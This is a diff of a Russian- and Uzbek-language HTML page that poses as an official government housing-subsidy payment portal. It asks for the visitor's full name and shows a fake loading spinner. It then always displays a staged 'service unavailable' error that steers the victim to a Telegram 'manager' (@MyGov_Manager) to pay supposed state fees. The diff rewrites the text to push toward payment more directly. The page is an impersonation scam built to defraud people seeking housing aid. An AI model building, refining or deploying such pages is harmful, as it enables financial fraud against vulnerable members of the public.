@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Портал оплаты — Жильё 2025</title>
+  <title>Оплата субсидии — Государственная программа</title>
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     * {
@@ -12,142 +12,132 @@
     body {
       margin: 0;
       font-family: 'Montserrat', sans-serif;
-      background: radial-gradient(circle at top left, #e3f2fd, #ffffff);
-      color: #222;
-      transition: background 0.5s ease;
+      background: linear-gradient(145deg, #e0f7fa, #ffffff);
+      color: #1c1c1c;
     }
     .container {
-      max-width: 560px;
-      margin: 60px auto;
+      max-width: 520px;
+      margin: 50px auto;
       padding: 2.5rem;
-      background: #fff;
-      border-radius: 18px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.12);
-      position: relative;
-      animation: fadeIn 1.2s ease-out;
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      animation: fadeIn 1s ease-out;
     }
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(40px); }
-      to { opacity: 1; transform: translateY(0); }
+      from {opacity: 0; transform: translateY(30px);}
+      to {opacity: 1; transform: translateY(0);}
     }
     .lang-switcher {
       text-align: right;
-      margin-bottom: 12px;
+      margin-bottom: 15px;
     }
     .lang-switcher button {
       margin-left: 8px;
-      padding: 7px 12px;
-      border-radius: 6px;
-      border: none;
-      background: #f1f1f1;
+      padding: 6px 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      background-color: #f5f5f5;
       cursor: pointer;
-      font-weight: 600;
-      transition: background 0.3s;
+      transition: background-color 0.3s;
     }
     .lang-switcher button:hover {
-      background: #d0e2f7;
+      background-color: #dceffc;
     }
     header {
       text-align: center;
-      margin-bottom: 2rem;
+      margin-bottom: 1.8rem;
     }
     .logo {
       width: 80px;
-      margin-bottom: 8px;
+      margin-bottom: 10px;
     }
     h1 {
-      font-size: 26px;
-      color: #0b5394;
-      margin: 0;
+      font-size: 24px;
+      color: #0d47a1;
       font-weight: 700;
+      margin: 0;
     }
     h2 {
+      font-size: 14px;
+      color: #555;
+      margin-top: 6px;
+    }
+    .intro {
+      margin-top: 20px;
+      margin-bottom: 25px;
       font-size: 15px;
-      font-weight: 400;
-      color: #666;
-      margin: 6px 0 30px;
+      line-height: 1.6;
+      color: #333;
     }
-    label {
-      display: block;
-      margin-bottom: 6px;
+    form label {
       font-weight: 600;
+      margin-bottom: 6px;
+      display: block;
     }
-    input {
+    input[type="text"] {
       width: 100%;
-      padding: 11px 14px;
-      margin-bottom: 18px;
+      padding: 12px;
+      margin-bottom: 16px;
       border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 14px;
-      transition: border-color 0.3s;
     }
-    input:focus {
-      border-color: #1a73e8;
-      outline: none;
-    }
-    button.submit {
-      background-color: #1a73e8;
-      color: white;
-      font-weight: bold;
-      padding: 14px;
+    .submit {
       width: 100%;
+      padding: 14px;
+      background-color: #1976d2;
       border: none;
       border-radius: 8px;
-      cursor: pointer;
+      color: white;
       font-size: 16px;
-      transition: background 0.3s;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
     }
-    button.submit:hover {
-      background-color: #155cc0;
-    }
-    .hidden {
-      display: none;
+    .submit:hover {
+      background-color: #125a9c;
     }
     #loading {
-      text-align: center;
-      font-size: 17px;
-      color: #444;
       margin-top: 25px;
+      text-align: center;
+      display: none;
     }
     .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #1a73e8;
-      border-radius: 50%;
-      width: 34px;
-      height: 34px;
-      animation: spin 1s linear infinite;
       margin: 12px auto;
+      width: 30px;
+      height: 30px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #1976d2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
     .error-box {
-      background: #fff0f0;
+      background: #fff3f3;
       border: 1px solid #e57373;
       padding: 20px;
+      margin-top: 25px;
       border-radius: 10px;
       color: #b71c1c;
-      font-size: 15px;
-      margin-top: 20px;
     }
     .error-box h3 {
       margin-top: 0;
-      font-size: 18px;
       color: #d32f2f;
-    }
-    .contact {
-      margin-top: 24px;
-      text-align: center;
+      font-size: 17px;
     }
     .contact a {
-      color: #0b5394;
-      font-weight: 600;
+      display: inline-block;
+      margin-top: 10px;
+      color: #0d47a1;
+      font-weight: bold;
       text-decoration: none;
-      transition: color 0.2s;
     }
     .contact a:hover {
-      color: #073d75;
+      color: #06327a;
     }
   </style>
 </head>
@@ -159,35 +149,28 @@
     </div>
     <header>
       <img src="IMG_6512.PNG" alt="Герб" class="logo">
-      <h1 id="title">Онлайн-портал господдержки</h1>
-      <h2 id="subtitle">Гарантированная помощь в рамках программы «Жильё 2025»</h2>
+      <h1 id="title">Оплата субсидии</h1>
+      <h2 id="subtitle">Государственная программа поддержки жилья</h2>
     </header>
-
-    <p style="margin-bottom: 20px; font-size: 15px; line-height: 1.6;">
-      Ежегодно тысячи семей получают реальную государственную помощь на улучшение жилищных условий.
-      Заполните форму ниже, чтобы пройти бесплатную проверку и получить доступ к оформлению субсидии
-      до <b>35% от стоимости жилья</b>. Услуги нотариуса и оформление кадастра — оплачиваются единым платёжным поручением.
+    <p class="intro" id="introText">
+      Для завершения оформления субсидии необходимо оплатить государственные услуги. Заполните форму ниже и подтвердите заявку. Дальнейшие инструкции поступят в Telegram.
     </p>
-
     <form id="stepForm">
-      <label id="fioLabel">Введите ваше ФИО</label>
+      <label id="fioLabel">Ваши ФИО</label>
       <input type="text" id="fioInput" placeholder="Иванов Иван Иванович" required>
-      <button class="submit" type="submit" id="continueBtn">Продолжить</button>
+      <button class="submit" type="submit" id="continueBtn">Перейти к оплате</button>
     </form>
-
-    <div id="loading" class="hidden">
-      <p id="loadingText">🔄 Загружается платёжная информация...</p>
+    <div id="loading">
+      <p id="loadingText">🔄 Подгружается модуль оплаты...</p>
       <div class="spinner"></div>
     </div>
-
     <div class="error-box hidden" id="errorBox">
-      <h3 id="errorTitle">⚠️ Сервис временно перегружен</h3>
-      <p id="errorMsg1">Из-за большого потока заявок система временно недоступна. Ваши данные сохранены.</p>
-      <p id="errorMsg2">Для завершения оформления обратитесь к персональному консультанту по Telegram.</p>
-    </div>
-
-    <div class="contact">
-      <p id="contactLink">👤 <a href="https://t.me/MyGov_Manager" target="_blank">@MyGov_Manager — Перейти в Telegram</a></p>
+      <h3 id="errorTitle">⚠️ Система временно недоступна</h3>
+      <p id="errorMsg1">Из-за высокой нагрузки модуль онлайн-оплаты временно отключён.</p>
+      <p id="errorMsg2">Пожалуйста, свяжитесь с уполномоченным менеджером в Telegram, чтобы завершить оформление.</p>
+      <div class="contact">
+        <a href="https://t.me/MyGov_Manager" target="_blank">👤 @MyGov_Manager — написать менеджеру</a>
+      </div>
     </div>
   </div>
   <script>
@@ -197,46 +180,48 @@
 
     form.addEventListener('submit', function(e) {
       e.preventDefault();
-      form.classList.add('hidden');
-      loading.classList.remove('hidden');
+      form.style.display = 'none';
+      loading.style.display = 'block';
 
       setTimeout(() => {
-        loading.classList.add('hidden');
+        loading.style.display = 'none';
         errorBox.classList.remove('hidden');
       }, 3000);
     });
 
-    const langs = {
-      ru: {
-        title: 'Онлайн-портал господдержки',
-        subtitle: 'Гарантированная помощь в рамках программы «Жильё 2025»',
-        fioLabel: 'Введите ваше ФИО',
-        placeholder: 'Иванов Иван Иванович',
-        button: 'Продолжить',
-        loading: '🔄 Загружается платёжная информация...',
-        errorTitle: '⚠️ Сервис временно перегружен',
-        errorMsg1: 'Из-за большого потока заявок система временно недоступна. Ваши данные сохранены.',
-        errorMsg2: 'Для завершения оформления обратитесь к персональному консультанту по Telegram.',
-        contact: '👤 <a href="https://t.me/MyGov_Manager" target="_blank">@MyGov_Manager — Перейти в Telegram</a>'
-      },
-      uz: {
-        title: 'Onlayn toʻlov portali',
-        subtitle: '"Uy-joy 2025" davlat dasturi',
-        fioLabel: 'Toʻliq F.I.Sh. kiriting',
-        placeholder: 'Aliyev Alisher Akmal oʻgʻli',
-        button: 'Davom etish',
-        loading: '🔄 Toʻlov maʼlumotlari yuklanmoqda...',
-        errorTitle: '⚠️ Texnik xatolik',
-        errorMsg1: 'Afsuski, toʻlov tizimi vaqtincha mavjud emas.',
-        errorMsg2: 'Maʼlumotlaringiz saqlandi. Toʻlovni yakunlash uchun menejer bilan bogʻlaning.',
-        contact: '👤 <a href="https://t.me/MyGov_Manager" target="_blank">@MyGov_Manager — Telegram orqali bogʻlanish</a>'
-      }
-    };
-
     function switchLang(lang) {
-      const t = langs[lang];
+      const content = {
+        ru: {
+          title: 'Оплата субсидии',
+          subtitle: 'Государственная программа поддержки жилья',
+          intro: 'Для завершения оформления субсидии необходимо оплатить государственные услуги. Заполните форму ниже и подтвердите заявку. Дальнейшие инструкции поступят в Telegram.',
+          fioLabel: 'Ваши ФИО',
+          placeholder: 'Иванов Иван Иванович',
+          button: 'Перейти к оплате',
+          loading: '🔄 Подгружается модуль оплаты...',
+          errorTitle: '⚠️ Система временно недоступна',
+          errorMsg1: 'Из-за высокой нагрузки модуль онлайн-оплаты временно отключён.',
+          errorMsg2: 'Пожалуйста, свяжитесь с уполномоченным менеджером в Telegram, чтобы завершить оформление.',
+          contact: '<a href="https://t.me/MyGov_Manager" target="_blank">👤 @MyGov_Manager — написать менеджеру</a>'
+        },
+        uz: {
+          title: 'Subsidiya to‘lov portali',
+          subtitle: 'Uy-joyni qo‘llab-quvvatlash dasturi',
+          intro: 'Subsidiya rasmiylashtirishni yakunlash uchun davlat xizmatlariga to‘lov zarur. Quyidagi formani to‘ldiring. Qo‘shimcha ko‘rsatmalar Telegram orqali yuboriladi.',
+          fioLabel: 'F.I.Sh. kiriting',
+          placeholder: 'Aliyev Alisher Akmal o‘g‘li',
+          button: 'To‘lovga o‘tish',
+          loading: '🔄 To‘lov moduli yuklanmoqda...',
+          errorTitle: '⚠️ Tizim vaqtincha mavjud emas',
+          errorMsg1: 'Yuklama yuqoriligi sababli onlayn to‘lov moduli o‘chirilgan.',
+          errorMsg2: 'Rasmiylashtirishni yakunlash uchun Telegram menejeriga yozing.',
+          contact: '<a href="https://t.me/MyGov_Manager" target="_blank">👤 @MyGov_Manager — menejer bilan bog‘lanish</a>'
+        }
+      };
+      const t = content[lang];
       document.getElementById('title').textContent = t.title;
       document.getElementById('subtitle').textContent = t.subtitle;
+      document.getElementById('introText').textContent = t.intro;
       document.getElementById('fioLabel').textContent = t.fioLabel;
       document.getElementById('fioInput').placeholder = t.placeholder;
       document.getElementById('continueBtn').textContent = t.button;
@@ -244,12 +229,12 @@
       document.getElementById('errorTitle').textContent = t.errorTitle;
       document.getElementById('errorMsg1').textContent = t.errorMsg1;
       document.getElementById('errorMsg2').textContent = t.errorMsg2;
-      document.getElementById('contactLink').innerHTML = t.contact;
+      document.querySelector('.contact').innerHTML = t.contact;
       localStorage.setItem('lang', lang);
     }
 
     const savedLang = localStorage.getItem('lang');
-    if (savedLang && langs[savedLang]) switchLang(savedLang);
+    if (savedLang) switchLang(savedLang);
   </script>
 </body>
 </html>
